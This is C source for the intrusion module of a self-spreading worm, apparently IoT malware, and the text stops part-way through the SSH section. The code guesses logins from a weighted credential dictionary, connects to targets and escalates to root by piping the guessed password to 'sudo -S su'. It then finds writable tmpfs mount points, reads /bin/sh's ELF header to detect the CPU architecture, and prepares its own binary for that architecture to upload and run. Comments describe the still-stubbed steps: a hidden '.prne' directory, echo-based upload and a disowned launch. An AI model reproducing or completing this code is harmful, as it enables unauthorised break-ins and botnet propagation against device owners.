#include "bne.h"
#include "util_ct.h"
#include "util_rt.h"
#include "iset.h"
#include "llist.h"
#include "rnd.h"
#include "libssh2.h"
#include "iobuf.h"
#include "endian.h"

#include <string.h>
#include <ctype.h>
#include <errno.h>

#include <elf.h>


static const struct timespec BNE_CONN_OP_TIMEOUT = { 60, 0 }; // 1m
static const struct timespec BNE_SCK_OP_TIMEOUT = { 30, 0 }; // 10s
static const struct timespec BNE_CLOSE_OP_TIMEOUT = { 1, 0 }; // 1s
static const struct timespec BNE_ERR_PAUSE = { 0, 500000000 }; // 500ms

#define BNE_CONN_TIMEOUT 5000 // 5s
#define BNE_CONN_ATTEMPT 3

#define BNE_HDELAY_TYPE_MIN		150		// 150ms
#define BNE_HDELAY_TYPE_VAR		100		// 100ms
#define BNE_HDELAY_PROMPT_MIN	800		// 0.8s
#define BNE_HDELAY_PROMPT_VAR	1000	// 1s

#define BNE_AVAIL_CMD_ECHO		0x01
#define BNE_AVAIL_CMD_CAT		0x02
#define BNE_AVAIL_CMD_DD		0x04
#define BNE_AVAIL_CMD_BASE64	0x08

#define BNE_CMD_TERMINATOR "PRNE-EOF960ef402-b026-49b2-9434-61aa64cf44f2"
#define BNE_TERM_CMD "echo -n "BNE_CMD_TERMINATOR"\n"


struct prne_bne {
	prne_iset_t cred_set;
	prne_rnd_t rnd;
	prne_bne_result_t result;
	prne_bne_param_t param;
};

typedef struct {
	unsigned int attempt;
	uint16_t port;
} bne_port_t;

typedef struct {
	LIBSSH2_SESSION *ss;
	LIBSSH2_CHANNEL *ch_shell;
	char *auth_list;
	int fd;
	prne_llist_t ports;
} bne_vssh_ctx_t;

typedef unsigned int bne_avail_cmds_t;

typedef struct {
	void *ctx;
	ssize_t (*read_f)( // combines stdout and stderr
		void *ctx,
		void *buf,
		const size_t len,
		pth_event_t ev);
	ssize_t (*write_f)( // loops on the buf to always return len or -1
		void *ctx,
		const void *buf,
		const size_t len,
		pth_event_t ev);
	uint8_t buf[2048];
	char line[256];
	prne_iobuf_t ib;
	prne_llist_t up_loc; // series of null-terminated string
	bne_avail_cmds_t avail_cmds;
} bne_sh_ctx_t;

static void bne_sh_ctx_free_mp (bne_sh_ctx_t *p) {
	for (prne_llist_entry_t *e = p->up_loc.head; e != NULL; e = e->next) {
		prne_free((void*)e->element);
	}
	prne_llist_clear(&p->up_loc);
}

static void bne_init_sh_ctx (bne_sh_ctx_t *p) {
	prne_memzero(p, sizeof(bne_sh_ctx_t));
	prne_init_llist(&p->up_loc);
	prne_init_iobuf(&p->ib);
	prne_iobuf_setextbuf(&p->ib, p->buf, sizeof(p->buf), 0);
}

static void bne_free_sh_ctx (bne_sh_ctx_t *p) {
	bne_sh_ctx_free_mp(p);
	prne_free_llist(&p->up_loc);

	prne_memzero(p, sizeof(bne_sh_ctx_t));
}

static bool bne_build_cred_set (prne_bne_t *ctx) {
	bool ret = true;

	prne_iset_clear(&ctx->cred_set);
	for (size_t i = 0; ret && i < ctx->param.cred_dict->cnt; i += 1) {
		ret = prne_iset_insert(
			&ctx->cred_set,
			(prne_iset_val_t)(ctx->param.cred_dict->arr + i));
	}

	return ret;
}

static void bne_delete_cred_w_id (prne_bne_t *ctx, const char *id) {
	prne_cred_dict_entry_t *ent;
	const char *ent_id;

	if (ctx->param.cb.enter_dd != NULL && !ctx->param.cb.enter_dd()) {
		return;
	}

	for (size_t i = 0; i < ctx->cred_set.size;) {
		ent = (prne_cred_dict_entry_t*)ctx->cred_set.arr[i];
		ent_id = ctx->param.cred_dict->m + ent->id;

		if (strcmp(id, ent_id) == 0) {
			prne_iset_erase(&ctx->cred_set, (prne_iset_val_t)ent);
		}
		else {
			i += 1;
		}
	}

	if (ctx->param.cb.exit_dd != NULL) {
		ctx->param.cb.exit_dd();
	}
}

static void bne_free_result_cred (prne_bne_t *ctx) {
	prne_free(ctx->result.cred.id);
	prne_free(ctx->result.cred.pw);
	ctx->result.cred.id = NULL;
	ctx->result.cred.pw = NULL;
}

/*
* Does linear search to save memory. This is slow. But hey, as long as it works.
*/
static bool bne_pop_cred (
	prne_bne_t *ctx,
	const bool per_id)
{
	prne_cred_dict_entry_t *ent, *rc = NULL;
	size_t coin;
	uint_fast16_t w_tmp;
	uint8_t wv;
	prne_iset_t w_set;
	prne_llist_t cl;
	const char *ent_id, *ent_pw;
	bool ret = true, id_match;

	if (ctx->cred_set.size == 0) {
		return false;
	}
	if (ctx->param.cb.enter_dd != NULL && !ctx->param.cb.enter_dd()) {
		ctx->result.err = errno;
		return false;
	}

	prne_init_iset(&w_set);
	prne_init_llist(&cl);

	// gather weight values
	for (size_t i = 0; i < ctx->cred_set.size; i += 1) {
		ent = (prne_cred_dict_entry_t*)ctx->cred_set.arr[i];
		if (!prne_iset_insert(&w_set, (prne_iset_val_t)(ent->weight))) {
			ctx->result.err = errno;
			ret = false;
			goto END;
		}
	}

	do {
		w_tmp = 0;
		for (size_t i = 0; i < w_set.size; i += 1) {
			w_tmp += (uint_fast16_t)w_set.arr[i];
		}

		// determine weight
		if (!prne_rnd(&ctx->rnd, (uint8_t*)&coin, sizeof(size_t))) {
			ctx->result.err = errno;
			ret = false;
			goto END;
		}

		if (w_tmp > 0) {
			coin = coin % w_tmp;

			w_tmp = 0;
			wv = (uint8_t)(w_set.arr[w_set.size - 1]);
			for (size_t i = 0; i < w_set.size; i += 1) {
				w_tmp += (uint_fast16_t)w_set.arr[i];
				if (coin < w_tmp) {
					wv = (uint8_t)(w_set.arr[i]);
					break;
				}
			}
		}
		else {
			wv = 0;
		}

		// search
		prne_llist_clear(&cl);
		for (size_t i = 0; i < ctx->cred_set.size; i += 1) {
			ent = (prne_cred_dict_entry_t*)ctx->cred_set.arr[i];
			ent_id = ctx->param.cred_dict->m + ent->id;

			if (per_id && ctx->result.cred.id != NULL) {
				id_match = strcmp(ctx->result.cred.id, ent_id) == 0;
			}
			else {
				id_match = true;
			}

			if (id_match && ent->weight == wv) {
				if (!prne_llist_append(&cl, (prne_llist_element_t)ent)) {
					ret = false;
					ctx->result.err = errno;
					goto END;
				}
			}
		}

		if (cl.size > 0) {
			prne_llist_entry_t *le;

			if (!prne_rnd(&ctx->rnd, (uint8_t*)&coin, sizeof(size_t))) {
				ctx->result.err = errno;
				ret = false;
				goto END;
			}
			coin = coin % cl.size;

			le = cl.head;
			for (size_t i = 0; i < coin; i += 1) {
				le = le->next;
			}

			rc = (prne_cred_dict_entry_t*)le->element;
			goto END;
		}
		else {
			// try next weight value
			prne_iset_erase(&w_set, (prne_iset_val_t)(wv));
		}
	} while (w_set.size > 0);

END:
	prne_free_iset(&w_set);
	prne_free_llist(&cl);
	bne_free_result_cred(ctx);
	if (rc != NULL && ret) {
		size_t id_len, pw_len;

		prne_iset_erase(&ctx->cred_set, (prne_iset_val_t)rc);

		ent_id = ctx->param.cred_dict->m + rc->id;
		ent_pw = ctx->param.cred_dict->m + rc->pw;
		id_len = strlen(ent_id);
		pw_len = strlen(ent_pw);

		ctx->result.cred.id = prne_alloc_str(id_len);
		ctx->result.cred.pw = prne_alloc_str(pw_len);
		if (ctx->result.cred.id == NULL || ctx->result.cred.pw == NULL) {
			ctx->result.err = errno;
			ret = false;
			bne_free_result_cred(ctx);
		}
		else {
			memcpy(ctx->result.cred.id, ent_id, id_len + 1);
			memcpy(ctx->result.cred.pw, ent_pw, pw_len + 1);
		}
	}

	if (ctx->param.cb.exit_dd != NULL) {
		ctx->param.cb.exit_dd();
	}

	return ret;
}

static bool bne_do_connect (
	const int af,
	const struct sockaddr *sa,
	const socklen_t sl,
	int *fd,
	pth_event_t ev)
{
	int f_ret;
	struct pollfd pfd;

	*fd = socket(af, SOCK_STREAM, 0);
	if (*fd < 0) {
		return false;
	}
	if (!prne_sck_fcntl(*fd)) {
		return false;
	}

	f_ret = connect(*fd, sa, sl);
	if (f_ret < 0 && errno != EINPROGRESS) {
		goto ERR;
	}

	pfd.fd = *fd;
	pfd.events = POLLOUT;
	f_ret = prne_pth_poll(&pfd, 1, BNE_CONN_TIMEOUT, ev);
	if (f_ret > 0) {
		socklen_t sl = sizeof(int);
		int sov = 0;

		if (!(pfd.revents & ~POLLOUT) &&
			getsockopt(*fd, SOL_SOCKET, SO_ERROR, &sov, &sl) == 0)
		{
			if (sov == 0) {
				return true;
			}
			errno = sov;
		}
	}

ERR:
	prne_close(*fd);
	*fd = -1;
	return true;
}

static void bne_reset_timer (
	pth_event_t *ev,
	const struct timespec *ts)
{
	pth_event_free(*ev, FALSE);
	*ev = pth_event(
		PTH_EVENT_TIME,
		prne_pth_tstimeout(*ts));
	prne_assert(*ev != NULL);
}

/*******************************************************************************
                              Telnet Vector Impl
*******************************************************************************/
static bool bne_do_vec_telnet (prne_bne_t *ctx) {
	// TODO
	return false;
}

/*******************************************************************************
                           Shell Op Abstraction Layer
*******************************************************************************/
typedef struct {
	char *path;
	size_t weight;
} bne_mp_t;

static int bne_mp_cmp_f (const void *a, const void *b) {
	const size_t w_a = ((const bne_mp_t*)a)->weight;
	const size_t w_b = ((const bne_mp_t*)b)->weight;

	return
		(w_a < w_b) ? -1 :
		(w_a > w_b) ? 1 :
		0;
}

static bool bne_sh_sync (
	prne_bne_t *ctx,
	bne_sh_ctx_t *s_ctx,
	pth_event_t ev)
{
	size_t len;
	ssize_t f_ret;
	char *cterm;

	strcpy(s_ctx->line, BNE_TERM_CMD);
	len = strlen(s_ctx->line);
	bne_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
	f_ret = s_ctx->write_f(s_ctx->ctx, s_ctx->line, len, ev);
	if (f_ret != (ssize_t)len) {
		return false;
	}

	cterm = NULL;
	prne_iobuf_reset(&s_ctx->ib);
	do {
		bne_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
		f_ret = s_ctx->read_f(
			s_ctx->ctx,
			s_ctx->ib.m + s_ctx->ib.len,
			s_ctx->ib.avail,
			ev);
		if (f_ret <= 0) {
			return false;
		}
		prne_iobuf_shift(&s_ctx->ib, f_ret);
		cterm = prne_strnstr(
			(char*)s_ctx->ib.m,
			s_ctx->ib.len,
			BNE_CMD_TERMINATOR,
			strlen(BNE_CMD_TERMINATOR));
	} while (s_ctx->ib.avail > 0 && cterm == NULL);
	if (cterm == NULL) {
		return false;
	}

	return true;
}

static int bne_sh_get_uid (
	prne_bne_t *ctx,
	bne_sh_ctx_t *s_ctx,
	pth_event_t ev)
{
	size_t len;
	ssize_t f_ret;
	char *cterm;
	int ret = 0; // assume uid is 0 if the command fails

	strcpy(s_ctx->line, "id -u;"BNE_TERM_CMD);
	len = strlen(s_ctx->line);
	bne_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
	f_ret = s_ctx->write_f(s_ctx->ctx, s_ctx->line, len, ev);
	if (f_ret != (ssize_t)len) {
		return -1;
	}

	cterm = NULL;
	prne_iobuf_reset(&s_ctx->ib);
	do {
		bne_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
		f_ret = s_ctx->read_f(
			s_ctx->ctx,
			s_ctx->ib.m + s_ctx->ib.len,
			s_ctx->ib.avail,
			ev);
		if (f_ret <= 0) {
			return -1;
		}
		prne_iobuf_shift(&s_ctx->ib, f_ret);
		cterm = prne_strnstr(
			(char*)s_ctx->ib.m,
			s_ctx->ib.len,
			BNE_CMD_TERMINATOR,
			strlen(BNE_CMD_TERMINATOR));
	} while (s_ctx->ib.avail > 0 && cterm == NULL);
	if (cterm == NULL) {
		return -1;
	}
	else {
		*cterm = 0;
		sscanf((char*)s_ctx->buf, "%d", &ret);
	}

	return ret;
}

static bool bne_sh_sudo (
	prne_bne_t *ctx,
	bne_sh_ctx_t *s_ctx,
	pth_event_t ev)
{
	static const char LF = '\n';
	char *colon;
	size_t pw_len;
	ssize_t f_ret;
	size_t len;
	char *cterm;

	strcpy(s_ctx->line, "sudo -S su;"BNE_TERM_CMD);
	len = strlen(s_ctx->line);
	bne_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
	f_ret = s_ctx->write_f(s_ctx->ctx, s_ctx->line, len, ev);
	if (f_ret != (ssize_t)len) {
		return false;
	}

	prne_iobuf_reset(&s_ctx->ib);
	do {
		bne_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
		f_ret = s_ctx->read_f(
			s_ctx->ctx,
			s_ctx->ib.m + s_ctx->ib.len,
			s_ctx->ib.avail,
			ev);
		if (f_ret <= 0) {
			return false;
		}
		prne_iobuf_shift(&s_ctx->ib, f_ret);
		colon = prne_strnchr((char*)s_ctx->ib.m, ':', s_ctx->ib.len);
		cterm = prne_strnstr(
			(char*)s_ctx->ib.m,
			s_ctx->ib.len,
			BNE_CMD_TERMINATOR,
			strlen(BNE_CMD_TERMINATOR));
	} while (s_ctx->ib.avail > 0 && cterm == NULL && colon == NULL);

	if (colon == NULL) {
/*
* UID is not 0, but sudo command is not available.
*/
		ctx->result.err = EPERM;
		return false;
	}

	pw_len = prne_nstrlen(ctx->result.cred.pw);
	bne_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
	if (pw_len > 0) {
		f_ret = s_ctx->write_f(
			s_ctx->ctx,
			ctx->result.cred.pw,
			pw_len,
			ev);
		if (f_ret != (ssize_t)pw_len) {
			return false;
		}
	}
	// hit enter
	f_ret = s_ctx->write_f(s_ctx->ctx, &LF, 1, ev);
	if (f_ret != 1) {
		return false;
	}

	// check the uid again
	if (!bne_sh_sync(ctx, s_ctx, ev) || bne_sh_get_uid(ctx, s_ctx, ev) != 0) {
		// Failed to sudo
		return false;
	}

	return true;
}

/*
* 1. Escalate shell if $(id -u) -ne 0
*	- Run "sudo su"
*	- Wait for prompt //.*:
*	- Type password
* 2. Check available commands
*	- echo
*	- cat
*	- dd
*	- base64
*	(if echo and cat not available, give up)
* 3. Find a suitable mount point for upload
*	- read /proc/mounts
*	- filter out ro, non-ephemeral fs
*	- prioritise:
*		/tmp: 4
*		/run: 3
*		/dev/shm: 2
*		/dev: 1
*		(other): 0
* 4. Determine arch
*/
static bool bne_sh_setup (
	prne_bne_t *ctx,
	bne_sh_ctx_t *s_ctx)
{
	bool ret = false;
	char *cterm, *lf, *mp;
	pth_event_t ev = NULL;
	size_t len;
	ssize_t f_ret;
	int uid;
	bne_mp_t *mp_arr = NULL;
	size_t mp_cnt = 0;
	prne_llist_entry_t *m_ent;
	uint8_t e_data = 0;
	uint16_t e_machine = 0;

	bne_sh_ctx_free_mp(s_ctx);

// TRY
	// Skip banner
	if (!bne_sh_sync(ctx, s_ctx, ev)) {
		goto END;
	}

	// Check uid
	uid = bne_sh_get_uid(ctx, s_ctx, ev);
	if (uid < 0) {
		goto END;
	}
	if (uid != 0) {
		// Not root. Try escalating the shell
		if (!bne_sh_sudo(ctx, s_ctx, ev)) {
			goto END;
		}
	}

	strcpy(
		s_ctx->line,
		"echo 2> /dev/null > /dev/null; echo $?;"
		"echo | cat 2> /dev/null > /dev/null; echo $?;"
		"echo | dd 2> /dev/null > /dev/null; echo $?;"
		"echo | base64 2> /dev/null > /dev/null; echo $?;"
		BNE_TERM_CMD);
	len = strlen(s_ctx->line);
	bne_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
	f_ret = s_ctx->write_f(s_ctx->ctx, s_ctx->line, len, ev);
	if (f_ret != (ssize_t)len) {
		goto END;
	}

	cterm = NULL;
	prne_iobuf_reset(&s_ctx->ib);
	do {
		bne_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
		f_ret = s_ctx->read_f(
			s_ctx->ctx,
			s_ctx->ib.m + s_ctx->ib.len,
			s_ctx->ib.avail,
			ev);
		if (f_ret <= 0) {
			goto END;
		}
		prne_iobuf_shift(&s_ctx->ib, f_ret);
		cterm = prne_strnstr(
			(char*)s_ctx->ib.m,
			s_ctx->ib.len,
			BNE_CMD_TERMINATOR,
			strlen(BNE_CMD_TERMINATOR));
	} while (s_ctx->ib.avail > 0 && cterm == NULL);
	if (cterm == NULL) {
		goto END;
	}
	else {
		int r_echo, r_cat, r_dd, r_base64;

		*cterm = 0;
		if (sscanf(
			(char*)s_ctx->buf,
			"%d %d %d %d",
			&r_echo,
			&r_cat,
			&r_dd,
			&r_base64) != 4)
		{
			goto END;
		}

		s_ctx->avail_cmds =
			(r_echo < 127 ? BNE_AVAIL_CMD_ECHO : 0) |
			(r_cat < 127 ? BNE_AVAIL_CMD_CAT : 0) |
			(r_dd < 127 ? BNE_AVAIL_CMD_DD : 0) |
			(r_base64 < 127 ? BNE_AVAIL_CMD_BASE64 : 0);
	}

	if (!((s_ctx->avail_cmds & BNE_AVAIL_CMD_ECHO) &&
		(s_ctx->avail_cmds & BNE_AVAIL_CMD_CAT)))
	{
		ctx->result.err = ENOSYS;
		goto END;
	}

	// read /proc/mounts
	strcpy(
		s_ctx->line,
		"cat /proc/mounts;"BNE_TERM_CMD);
	len = strlen(s_ctx->line);
	bne_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
	f_ret = s_ctx->write_f(s_ctx->ctx, s_ctx->line, len, ev);
	if (f_ret != (ssize_t)len) {
		goto END;
	}

	cterm = NULL;
	prne_iobuf_reset(&s_ctx->ib);
	do {
		bne_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
		f_ret = s_ctx->read_f(
			s_ctx->ctx,
			s_ctx->ib.m + s_ctx->ib.len,
			s_ctx->ib.avail,
			ev);
		if (f_ret <= 0) {
			goto END;
		}
		prne_iobuf_shift(&s_ctx->ib, f_ret);

		while (true) {
			lf = prne_strnchr((char*)s_ctx->ib.m, '\n', s_ctx->ib.len);
			if (lf == NULL) {
				break;
			}
			*lf = 0;

			// fs
			if (sscanf(
				(char*)s_ctx->ib.m,
				"%*s %*s %255s %*s %*d %*d",
				s_ctx->line) != 1)
			{
				goto ENDL;
			}
			if (!(strcmp(s_ctx->line, "devtmpfs") == 0 ||
				strcmp(s_ctx->line, "tmpfs") == 0))
			{
				goto ENDL;
			}
			// options
			if (sscanf(
				(char*)s_ctx->ib.m,
				"%*s %*s %*s %255s %*d %*d",
				s_ctx->line) != 1)
			{
				goto ENDL;
			}
			if (strstr(s_ctx->line, "rw") != s_ctx->line) {
				goto ENDL;
			}
			// mount point
			if (sscanf(
				(char*)s_ctx->ib.m,
				"%*s %255s %*s %*s %*d %*d",
				s_ctx->line) != 1)
			{
				goto ENDL;
			}
			len = strlen(s_ctx->line);
			mp = prne_alloc_str(len);
			if (mp == NULL) {
				ctx->result.err = errno;
				goto END;
			}
			memcpy(mp, s_ctx->line, len + 1);
			if (prne_llist_append(
				&s_ctx->up_loc,
				(prne_llist_element_t)mp) == NULL)
			{
				ctx->result.err = errno;
				prne_free(mp);
				goto END;
			}
ENDL:
			prne_iobuf_shift(&s_ctx->ib, -(lf - (char*)s_ctx->ib.m + 1));
		}

		cterm = prne_strnstr(
			(char*)s_ctx->ib.m,
			s_ctx->ib.len,
			BNE_CMD_TERMINATOR,
			strlen(BNE_CMD_TERMINATOR));
	} while (s_ctx->ib.avail > 0 && cterm == NULL);

	if (s_ctx->up_loc.size == 0) {
		// no suitable mount point found
		ctx->result.err = ENOSPC;
		goto END;
	}

	// sort candidate mount points
	mp_cnt = s_ctx->up_loc.size;
	mp_arr = (bne_mp_t*)prne_malloc(sizeof(bne_mp_t), mp_cnt);
	if (mp_arr == NULL) {
		ctx->result.err = errno;
		goto END;
	}
	m_ent = s_ctx->up_loc.head;
	for (size_t i = 0; i < mp_cnt; i += 1) {
		mp = (char*)m_ent->element;
		mp_arr[i].path = mp;
		if (strcmp(mp, "/tmp") == 0) {
			mp_arr[i].weight = 4;
		}
		else if (strcmp(mp, "/run") == 0) {
			mp_arr[i].weight = 3;
		}
		else if (strcmp(mp, "/dev/shm") == 0) {
			mp_arr[i].weight = 2;
		}
		else if (strcmp(mp, "/dev") == 0) {
			mp_arr[i].weight = 1;
		}
		else {
			mp_arr[i].weight = 0;
		}
		m_ent = m_ent->next;
	}
	prne_llist_clear(&s_ctx->up_loc);
	qsort(mp_arr, mp_cnt, sizeof(bne_mp_t), bne_mp_cmp_f);
	for (size_t i = 0, j = mp_cnt - 1; i < mp_cnt; i += 1, j -= 1) {
		if (prne_llist_append(
			&s_ctx->up_loc,
			(prne_llist_element_t)mp_arr[j].path) != NULL)
		{
			mp_arr[j].path = NULL;
		}
		else {
			ctx->result.err = errno;
			goto END;
		}
	}
	prne_free(mp_arr);
	mp_arr = NULL;
	mp_cnt = 0;

	// determine arch
	strcpy(s_ctx->line, "cat /bin/sh;"BNE_TERM_CMD);
	len = strlen(s_ctx->line);
	bne_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
	f_ret = s_ctx->write_f(s_ctx->ctx, s_ctx->line, len, ev);
	if (f_ret != (ssize_t)len) {
		goto END;
	}

	while (true) {
		prne_iobuf_reset(&s_ctx->ib);
		bne_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
		f_ret = s_ctx->read_f(
			s_ctx->ctx,
			s_ctx->ib.m + s_ctx->ib.len,
			s_ctx->ib.avail,
			ev);
		if (f_ret <= 0) {
			goto END;
		}
		prne_iobuf_shift(&s_ctx->ib, f_ret);

		if (e_data == 0 && s_ctx->ib.len >= EI_NIDENT) {
			if (!(s_ctx->ib.m[EI_MAG0] == ELFMAG0 &&
				s_ctx->ib.m[EI_MAG1] == ELFMAG1 &&
				s_ctx->ib.m[EI_MAG2] == ELFMAG2 &&
				s_ctx->ib.m[EI_MAG3] == ELFMAG3))
			{
				ctx->result.err = ENOEXEC;
				goto END;
			}

			if (s_ctx->ib.m[EI_CLASS] == ELFCLASS32) {
				const Elf32_Ehdr *hdr = (const Elf32_Ehdr*)s_ctx->ib.m;

				if (s_ctx->ib.len < sizeof(Elf32_Ehdr)) {
					goto NEXT;
				}
				e_machine = hdr->e_machine;
			}
			else if (s_ctx->ib.m[EI_CLASS] == ELFCLASS64) {
				const Elf64_Ehdr *hdr = (const Elf64_Ehdr*)s_ctx->ib.m;

				if (s_ctx->ib.len < sizeof(Elf64_Ehdr)) {
					goto NEXT;
				}
				e_machine = hdr->e_machine;
			}
			else {
				ctx->result.err = ENOEXEC;
				goto END;
			}

			e_data = s_ctx->ib.m[EI_DATA];
			switch (e_data) {
			case ELFDATA2LSB: e_machine = prne_le16toh(e_machine); break;
			case ELFDATA2MSB: e_machine = prne_be16toh(e_machine); break;
			default:
				ctx->result.err = ENOEXEC;
				goto END;
			}
		}
NEXT:
		cterm = prne_strnstr(
			(char*)s_ctx->ib.m,
			s_ctx->ib.len,
			BNE_CMD_TERMINATOR,
			strlen(BNE_CMD_TERMINATOR));
		if (cterm != NULL) {
			break;
		}
	}

	if (e_data == 0) {
		ctx->result.err = ENOEXEC;
		goto END;
	}
	if (e_machine == EM_ARM) {
		bool seen_v7 = false, seen_vfp = false, seen_thumb = false;

		// read /proc/cpuinfo
		strcpy(s_ctx->line, "cat /proc/cpuinfo;"BNE_TERM_CMD);
		len = strlen(s_ctx->line);
		bne_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
		f_ret = s_ctx->write_f(s_ctx->ctx, s_ctx->line, len, ev);
		if (f_ret != (ssize_t)len) {
			goto END;
		}

		cterm = NULL;
		prne_iobuf_reset(&s_ctx->ib);
		do {
			bne_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
			f_ret = s_ctx->read_f(
				s_ctx->ctx,
				s_ctx->ib.m + s_ctx->ib.len,
				s_ctx->ib.avail,
				ev);
			if (f_ret <= 0) {
				goto END;
			}
			prne_iobuf_shift(&s_ctx->ib, f_ret);

			while (true) {
				lf = prne_strnchr((char*)s_ctx->ib.m, '\n', s_ctx->ib.len);
				if (lf == NULL) {
					break;
				}
				*lf = 0;
				prne_transstr((char*)s_ctx->ib.m, tolower);

				if (ctx->result.arch == PRNE_ARCH_NONE) {
					if (strstr((char*)s_ctx->ib.m, "processor") ==
						(char*)s_ctx->ib.m ||
						strstr((char*)s_ctx->ib.m, "model name") ==
						(char*)s_ctx->ib.m)
					{
						if (strstr((char*)s_ctx->ib.m, "v7") != NULL) {
							seen_v7 = true;
						}
					}
					else if (strstr((char*)s_ctx->ib.m, "features") ==
						(char*)s_ctx->ib.m)
					{
						if (strstr((char*)s_ctx->ib.m, "vfp") != NULL) {
							seen_vfp = true;
						}
						if (strstr((char*)s_ctx->ib.m, "thumb") != NULL) {
							seen_thumb = true;
						}
					}
				}

				prne_iobuf_shift(&s_ctx->ib, -(lf - (char*)s_ctx->ib.m + 1));
			}

			cterm = prne_strnstr(
				(char*)s_ctx->ib.m,
				s_ctx->ib.len,
				BNE_CMD_TERMINATOR,
				strlen(BNE_CMD_TERMINATOR));
		} while (s_ctx->ib.avail > 0 && cterm == NULL);

		if (seen_v7 && seen_vfp && seen_thumb) {
			ctx->result.arch = PRNE_ARCH_ARMV7;
		}
		else {
			ctx->result.arch = PRNE_ARCH_ARMV4T;
		}
	}
	else {
		switch (e_data) {
		case ELFDATA2LSB:
			switch (e_machine) {
			case EM_386: ctx->result.arch = PRNE_ARCH_I686; break;
			case EM_X86_64: ctx->result.arch = PRNE_ARCH_X86_64; break;
			case EM_AARCH64: ctx->result.arch = PRNE_ARCH_AARCH64; break;
			case EM_MIPS: ctx->result.arch = PRNE_ARCH_MPSL; break;
			case EM_SH: ctx->result.arch = PRNE_ARCH_SH4; break;
			case EM_ARC: ctx->result.arch = PRNE_ARCH_ARC; break;
			}
			break;
		case ELFDATA2MSB:
			switch (e_machine) {
			case EM_MIPS: ctx->result.arch = PRNE_ARCH_MIPS; break;
			case EM_PPC: ctx->result.arch = PRNE_ARCH_PPC; break;
			case EM_68K: ctx->result.arch = PRNE_ARCH_M68K; break;
			case EM_ARC: ctx->result.arch = PRNE_ARCH_ARCEB; break;
			}
			break;
		}
	}

	ret = ctx->result.arch != PRNE_ARCH_NONE;

END: // CATCH
	for (size_t i = 0; i < mp_cnt; i += 1) {
		prne_free(mp_arr[i].path);
	}
	prne_free(mp_arr);
	pth_event_free(ev, FALSE);
	return ret;
}

/*
* mkdir "$(dir)/.prne" &&
* cd "$(dir)/.prne" &&
* touch "$exec_name" &&
* chmod "$mode" "$exec_name"
*/
static bool bne_sh_prep_upload (
	prne_bne_t *ctx,
	bne_sh_ctx_t *s_ctx,
	const char *dir,
	const char *exec_name,
	const char *mode)
{
	// TODO
	return false;
}

/*
* When upload fails
* rm -rf "$(dir)/.prne"
*/
static bool bne_sh_cleanup_upload (
	prne_bne_t *ctx,
	bne_sh_ctx_t *s_ctx,
	const char *dir)
{
	// TODO
	return false;
}

/*
* - echo -ne > "$exec"
* - echo -ne "binary" >> "$exec"
*/
static bool bne_sh_upload_echo (
	prne_bne_t *ctx,
	bne_sh_ctx_t *s_ctx,
	const char *exec)
{
	// TODO
	return false;
}

/*
* - Run executable: "./$exec" & disown
*/
static bool bne_sh_run_exec (
	prne_bne_t *ctx,
	bne_sh_ctx_t *s_ctx,
	const char *exec)
{
	// TODO
	return false;
}

static bool bne_do_shell (prne_bne_t *ctx, bne_sh_ctx_t *sh_ctx) {
	static const bne_avail_cmds_t IMPL_UPLOAD_METHODS =
		BNE_AVAIL_CMD_ECHO;
	bool ret = false;
	bne_avail_cmds_t avail_cmd, cur_cmd;
	bool (*upload_f)(prne_bne_t *ctx, bne_sh_ctx_t *s_ctx, const char *exec);
	char *exec_name = NULL;
	prne_bin_rcb_ctx_t rcb;

	prne_init_bin_rcb_ctx(&rcb);

// TRY
	exec_name = ctx->param.cb.exec_name();
	if (exec_name == NULL) {
		ctx->result.err = errno;
		goto END;
	}

	if (!bne_sh_setup(ctx, sh_ctx)) {
		goto END;
	}

	ctx->result.prc = prne_start_bin_rcb(
		&rcb,
		ctx->result.arch,
		ctx->param.rcb.self,
		ctx->param.rcb.m_self,
		ctx->param.rcb.self_len,
		ctx->param.rcb.exec_len,
		ctx->param.rcb.m_dv,
		ctx->param.rcb.dv_len,
		ctx->param.rcb.ba);
	if (ctx->result.prc == PRNE_PACK_RC_NO_ARCH) {
		// retry with compatible arch if available
		switch (ctx->result.arch) {
		case PRNE_ARCH_AARCH64:
		case PRNE_ARCH_ARMV7:
			ctx->result.arch = PRNE_ARCH_ARMV4T;
			break;
		case PRNE_ARCH_X86_64:
			ctx->result.arch = PRNE_ARCH_I686;
			break;
		default: goto END;
		}
		ctx->result.prc = prne_start_bin_rcb(
			&rcb,
			ctx->result.arch,
			ctx->param.rcb.self,
			ctx->param.rcb.m_self,
			ctx->param.rcb.self_len,
			ctx->param.rcb.exec_len,
			ctx->param.rcb.m_dv,
			ctx->param.rcb.dv_len,
			ctx->param.rcb.ba);
	}
	if (ctx->result.prc != PRNE_PACK_RC_OK) {
		goto END;
	}

	for (prne_llist_entry_t *ent = sh_ctx->up_loc.head;
		ent != NULL;
		ent = ent->next)
	{
		char *mp = (char*)ent->element;

		avail_cmd = sh_ctx->avail_cmds & IMPL_UPLOAD_METHODS;
		while (true) {
			upload_f = NULL;

			cur_cmd = avail_cmd & BNE_AVAIL_CMD_ECHO;
			if (cur_cmd) {
				avail_cmd &= ~cur_cmd;
				upload_f = bne_sh_upload_echo;
				goto START_UPLOAD;
			}

START_UPLOAD:
			if (upload_f == NULL) {
				break;
			}

			ret = bne_sh_prep_upload(
				ctx,
				sh_ctx,
				mp,
				exec_name,
				"700");
			if (ret) {
				ret = upload_f(ctx, sh_ctx, exec_name);
				if (ret) {
					ret = bne_sh_run_exec(ctx, sh_ctx, exec_name);
					if (ret) {
						goto END;
					}
				}
				bne_sh_cleanup_upload(ctx, sh_ctx, mp);
			}
		}
	}

END: // CATCH
	prne_free_bin_rcb_ctx(&rcb);
	prne_free(exec_name);

	return ret;
}

/*******************************************************************************
                                SSH Vector Impl
*******************************************************************************/
static void bne_vssh_discon (
	bne_vssh_ctx_t *vs,
	const struct timespec *to,
